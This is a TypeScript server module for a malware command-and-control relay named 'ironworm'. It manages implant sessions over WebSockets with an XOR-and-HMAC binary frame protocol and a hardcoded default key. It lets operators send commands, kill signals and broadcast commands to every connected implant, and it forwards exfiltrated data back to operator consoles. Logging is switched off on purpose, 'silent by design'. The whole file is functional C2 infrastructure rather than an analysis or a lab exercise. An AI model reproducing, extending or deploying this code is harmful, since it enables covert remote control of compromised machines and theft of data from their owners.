/**
 * C2 Relay — XOR+HMAC-SHA256 binary frame relay
 *
 * Two WS endpoints share this module:
 *   /api/ws/c2          — operator console (C2PollerPanel)
 *   /api/ws/c2-sniffer  — passive traffic mirror (C2TrafficSniffer)
 *
 * Implants connect as "operator" sessions sending binary frames.
 * The relay parses each frame, extracts session_id from AUTH frames,
 * mirrors every frame to all active sniffer connections (as a JSON envelope),
 * and routes operator commands back to matching implant sessions.
 *
 * No pino logging for C2 traffic — silent by design.
 */

import type { WebSocket } from "ws";
import { createHmac } from "crypto";
import { C2OperatorCommandSchema } from "../lib/schemas.js";

// ─── Protocol constants ────────────────────────────────────────────────────
const MAGIC        = Buffer.from([0x49, 0x52, 0x4e, 0x57]); // IRNW
const VERSION      = 0x03;
const HEADER_SIZE  = 14;
const HMAC_SIZE    = 32;

const FrameType = {
  HEARTBEAT: 0x01,
  CMD:       0x02,
  RESPONSE:  0x03,
  EXFIL:     0x04,
  AUTH:      0x05,
  PROXY:     0x06,
  KILL:      0x07,
  UPDATE:    0x08,
  ACK:       0x09,
  ERROR:     0x0a,
} as const;

const FrameTypeName: Record<number, string> = {
  0x01: "HEARTBEAT", 0x02: "CMD",    0x03: "RESPONSE",
  0x04: "EXFIL",     0x05: "AUTH",   0x06: "PROXY",
  0x07: "KILL",      0x08: "UPDATE", 0x09: "ACK", 0x0a: "ERROR",
};

// ─── Key derivation (mirrors c2-protocol.ts client-side logic) ────────────
const DEFAULT_PASSPHRASE = process.env["C2_KEY"] ?? "ironworm-c2-key";

function deriveKey(passphrase: string): Buffer {
  const enc    = Buffer.from(passphrase);
  const out    = Buffer.alloc(64);
  const rounds = [0x49, 0x52, 0x4e, 0x57, 0xde, 0xad, 0xc0, 0xde];
  for (let b = 0; b < 64; b++) {
    let v = rounds[b % 8]!;
    for (let i = 0; i < enc.length; i++) v = ((v << 3) | (v >>> 5)) ^ enc[i]!;
    v ^= (b * 0xab) & 0xff;
    out[b] = v & 0xff;
  }
  return out;
}

const RELAY_KEY = deriveKey(DEFAULT_PASSPHRASE);

// ─── XOR cipher ───────────────────────────────────────────────────────────
function xorCipher(data: Buffer, key: Buffer): Buffer {
  const out = Buffer.allocUnsafe(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i]! ^ key[i % key.length]!;
  return out;
}

// ─── HMAC verification ────────────────────────────────────────────────────
function hmacVerify(hmacKey: Buffer, body: Buffer, sig: Buffer): boolean {
  const expected = createHmac("sha256", hmacKey).update(body).digest();
  if (expected.length !== sig.length) return false;
  let diff = 0;
  for (let i = 0; i < expected.length; i++) diff |= expected[i]! ^ sig[i]!;
  return diff === 0;
}

// ─── HMAC sign ────────────────────────────────────────────────────────────
function hmacSign(hmacKey: Buffer, body: Buffer): Buffer {
  return createHmac("sha256", hmacKey).update(body).digest();
}

// ─── Frame encoding ───────────────────────────────────────────────────────
function encodeFrame(type: number, payload: Buffer, key: Buffer, seq: number): Buffer {
  const xorKey  = key.subarray(0, 32);
  const hmacKey = key.subarray(32, 64);

  const encPayload = xorCipher(payload, xorKey);
  const header     = Buffer.alloc(HEADER_SIZE);
  MAGIC.copy(header, 0);
  header[4] = VERSION;
  header[5] = type;
  header.writeUInt32BE(seq,             6);
  header.writeUInt32BE(encPayload.length, 10);

  const body = Buffer.concat([header, encPayload]);
  const hmac = hmacSign(hmacKey, body);
  return Buffer.concat([body, hmac]);
}

// ─── Frame decoding ───────────────────────────────────────────────────────
interface DecodedFrame {
  type:    number;
  seq:     number;
  payload: Buffer;
  hmacOk:  boolean;
}

function decodeFrame(raw: Buffer, key: Buffer): DecodedFrame | null {
  if (raw.length < HEADER_SIZE + HMAC_SIZE) return null;
  for (let i = 0; i < 4; i++) if (raw[i] !== MAGIC[i]) return null;

  const type   = raw[5]!;
  const seq    = raw.readUInt32BE(6);
  const payLen = raw.readUInt32BE(10);

  if (raw.length < HEADER_SIZE + payLen + HMAC_SIZE) return null;

  const body    = raw.subarray(0, HEADER_SIZE + payLen);
  const hmacSig = raw.subarray(HEADER_SIZE + payLen, HEADER_SIZE + payLen + HMAC_SIZE);
  const hmacKey = key.subarray(32, 64);
  const hmacOk  = hmacVerify(hmacKey, body, hmacSig);

  const xorKey     = key.subarray(0, 32);
  const encPayload = raw.subarray(HEADER_SIZE, HEADER_SIZE + payLen);
  const payload    = xorCipher(encPayload, xorKey);

  return { type, seq, payload, hmacOk };
}

function parsePayload(payload: Buffer): unknown {
  try   { return JSON.parse(payload.toString("utf8")); }
  catch { return { raw: payload.toString("hex") }; }
}

function toHexStr(buf: Buffer): string {
  return buf.toString("hex").replace(/(.{2})/g, "$1 ").trim();
}

// ─── Session state ────────────────────────────────────────────────────────
interface ImplantSession {
  sessionId: string;
  ws:        WebSocket;
  connectedAt: number;
  lastSeen:    number;
  frameCount:  number;
  key:         Buffer;
  seqTx:       number;
}

const sessions  = new Map<string, ImplantSession>(); // sessionId → session
const sniffers  = new Set<WebSocket>();               // passive mirrors
const operators = new Set<WebSocket>();               // operator consoles
let   relaySeq  = 0;

// ─── Mirror a raw frame to all sniffers ───────────────────────────────────
function mirrorToSniffers(
  raw:       Buffer,
  dir:       "rx" | "tx",
  sessionId: string | null,
  hmacOk:    boolean,
  typeName:  string,
): void {
  if (sniffers.size === 0) return;
  const envelope = JSON.stringify({
    dir,
    hex:        toHexStr(raw),
    session_id: sessionId,
    hmac_ok:    hmacOk,
    type:       typeName,
    ts:         Date.now(),
  });
  for (const s of sniffers) {
    if (s.readyState === 1 /* OPEN */) {
      try { s.send(envelope); } catch { sniffers.delete(s); }
    }
  }
}

// ─── Broadcast operator event to all operator consoles ────────────────────
function broadcastToOperators(obj: unknown): void {
  if (operators.size === 0) return;
  const msg = JSON.stringify(obj);
  for (const op of operators) {
    if (op.readyState === 1) {
      try { op.send(msg); } catch { operators.delete(op); }
    }
  }
}

// ─── Operator console handler (/api/ws/c2) ────────────────────────────────
export function handleC2Operator(ws: WebSocket): void {
  operators.add(ws);

  // Send current session list immediately
  ws.send(JSON.stringify({
    event: "sessions",
    sessions: [...sessions.values()].map(s => ({
      session_id:   s.sessionId,
      connected_at: s.connectedAt,
      last_seen:    s.lastSeen,
      frame_count:  s.frameCount,
    })),
  }));

  ws.on("message", (data) => {
    let _parsed: unknown;
    try { _parsed = JSON.parse(data.toString()); } catch { return; }
    const _r = C2OperatorCommandSchema.safeParse(_parsed);
    if (!_r.success) return;
    const msg = _r.data;

    const target = msg.session_id ? sessions.get(msg.session_id) : null;

    if (msg.type === "list_sessions") {
      ws.send(JSON.stringify({
        event: "sessions",
        sessions: [...sessions.values()].map(s => ({
          session_id:   s.sessionId,
          connected_at: s.connectedAt,
          last_seen:    s.lastSeen,
          frame_count:  s.frameCount,
        })),
      }));
      return;
    }

    if (msg.type === "kill" && target) {
      const frame = encodeFrame(FrameType.KILL, Buffer.from(JSON.stringify({ reason: "operator_kill" })), target.key, ++target.seqTx);
      mirrorToSniffers(frame, "tx", target.sessionId, true, "KILL");
      try { target.ws.send(frame); } catch { /* ignore */ }
      return;
    }

    if (msg.type === "cmd" && target && msg.cmd) {
      const payload = Buffer.from(JSON.stringify({ cmd: msg.cmd, args: msg.args ?? {} }));
      const frame   = encodeFrame(FrameType.CMD, payload, target.key, ++target.seqTx);
      mirrorToSniffers(frame, "tx", target.sessionId, true, "CMD");
      try { target.ws.send(frame); } catch { /* ignore */ }
      return;
    }

    if (msg.type === "heartbeat" && target) {
      const frame = encodeFrame(FrameType.HEARTBEAT, Buffer.from(JSON.stringify({ ts: Date.now() })), target.key, ++target.seqTx);
      mirrorToSniffers(frame, "tx", target.sessionId, true, "HEARTBEAT");
      try { target.ws.send(frame); } catch { /* ignore */ }
      return;
    }

    // Broadcast raw command to all sessions if no specific target
    if (msg.type === "broadcast" && msg.cmd) {
      for (const [, session] of sessions) {
        const payload = Buffer.from(JSON.stringify({ cmd: msg.cmd, args: msg.args ?? {} }));
        const frame   = encodeFrame(FrameType.CMD, payload, session.key, ++session.seqTx);
        mirrorToSniffers(frame, "tx", session.sessionId, true, "CMD");
        try { session.ws.send(frame); } catch { /* ignore */ }
      }
    }
  });

  ws.on("close", () => { operators.delete(ws); });
  ws.on("error", () => { operators.delete(ws); });
}

// ─── Implant handler — called when an implant connects via WS ─────────────
export function handleC2Implant(ws: WebSocket): void {
  let sessionId: string | null  = null;
  let sessionKey: Buffer         = RELAY_KEY;
  let seqExpect  = 0;
  let seqTx      = 0;

  // Buffer for partial frames (WebSocket can split messages)
  const chunks: Buffer[] = [];

  // Send AUTH challenge
  const challenge = Buffer.from(JSON.stringify({
    type:    "auth_challenge",
    nonce:   Math.random().toString(36).slice(2),
    version: VERSION,
    ts:      Date.now(),
  }));
  const authChallenge = encodeFrame(FrameType.AUTH, challenge, RELAY_KEY, ++relaySeq);
  try { ws.send(authChallenge); } catch { ws.close(); return; }
  mirrorToSniffers(authChallenge, "tx", null, true, "AUTH");

  ws.on("message", (data: Buffer | ArrayBuffer | Buffer[]) => {
    const raw = Buffer.isBuffer(data) ? data
      : data instanceof ArrayBuffer   ? Buffer.from(data)
      : Buffer.concat(data as Buffer[]);

    const frame = decodeFrame(raw, sessionKey);
    if (!frame) return; // drop malformed frames silently

    const typeName = FrameTypeName[frame.type] ?? "UNKNOWN";

    // Update session tracking on AUTH
    if (frame.type === FrameType.AUTH) {
      const parsed = parsePayload(frame.payload) as Record<string, unknown>;
      const sid    = (parsed["session_id"] as string) ?? `implant-${Date.now().toString(36)}`;
      sessionId    = sid;

      // Optionally derive per-session key from session_id
      if (parsed["key_hint"] as string) {
        sessionKey = deriveKey(`${DEFAULT_PASSPHRASE}:${String(parsed["key_hint"])}`);
      }

      const existing = sessions.get(sid);
      if (existing) {
        try { existing.ws.close(1001, "Replaced by new connection"); } catch { /* ok */ }
      }

      const session: ImplantSession = {
        sessionId: sid, ws, connectedAt: Date.now(),
        lastSeen: Date.now(), frameCount: 1, key: sessionKey, seqTx,
      };
      sessions.set(sid, session);

      // ACK the auth
      const ackPayload = Buffer.from(JSON.stringify({ status: "ok", session_id: sid }));
      const ackFrame   = encodeFrame(FrameType.ACK, ackPayload, sessionKey, ++seqTx);
      mirrorToSniffers(ackFrame, "tx", sid, true, "ACK");
      try { ws.send(ackFrame); } catch { /* ignore */ }

      broadcastToOperators({ event: "session_new", session_id: sid, connected_at: Date.now() });
    } else if (sessionId) {
      const session = sessions.get(sessionId);
      if (session) {
        session.lastSeen  = Date.now();
        session.frameCount++;
      }
    }

    // Mirror rx frame to all sniffer connections
    mirrorToSniffers(raw, "rx", sessionId, frame.hmacOk, typeName);

    // Forward RESPONSE and EXFIL frames to operator consoles
    if (frame.type === FrameType.RESPONSE || frame.type === FrameType.EXFIL) {
      broadcastToOperators({
        event:      "frame",
        type:       typeName,
        session_id: sessionId,
        payload:    parsePayload(frame.payload),
        hmac_ok:    frame.hmacOk,
        seq:        frame.seq,
        ts:         Date.now(),
      });
    }

    // Heartbeat: respond with ACK
    if (frame.type === FrameType.HEARTBEAT && sessionId) {
      const session = sessions.get(sessionId);
      if (session) {
        const ack  = Buffer.from(JSON.stringify({ pong: true, ts: Date.now() }));
        const ackF = encodeFrame(FrameType.ACK, ack, session.key, ++session.seqTx);
        mirrorToSniffers(ackF, "tx", sessionId, true, "ACK");
        try { ws.send(ackF); } catch { /* ignore */ }
      }
    }

    seqExpect = frame.seq + 1;
  });

  ws.on("close", () => {
    if (sessionId) {
      sessions.delete(sessionId);
      broadcastToOperators({ event: "session_closed", session_id: sessionId });
    }
  });

  ws.on("error", () => {
    if (sessionId) {
      sessions.delete(sessionId);
      broadcastToOperators({ event: "session_error", session_id: sessionId });
    }
  });
}

// ─── Sniffer handler (/api/ws/c2-sniffer) ────────────────────────────────
export function handleC2Sniffer(ws: WebSocket): void {
  sniffers.add(ws);

  // Send current session list to new sniffer
  ws.send(JSON.stringify({
    event: "connected",
    sessions: [...sessions.values()].map(s => ({
      session_id:   s.sessionId,
      connected_at: s.connectedAt,
      last_seen:    s.lastSeen,
      frame_count:  s.frameCount,
    })),
    sniffer_count: sniffers.size,
    operator_count: operators.size,
  }));

  ws.on("close", () => { sniffers.delete(ws); });
  ws.on("error", () => { sniffers.delete(ws); });
}

// ─── Export session stats (for REST /api/c2/sessions) ────────────────────
export function getSessionStats() {
  return {
    sessions: [...sessions.values()].map(s => ({
      session_id:   s.sessionId,
      connected_at: s.connectedAt,
      last_seen:    s.lastSeen,
      frame_count:  s.frameCount,
    })),
    sniffer_count:  sniffers.size,
    operator_count: operators.size,
  };
}
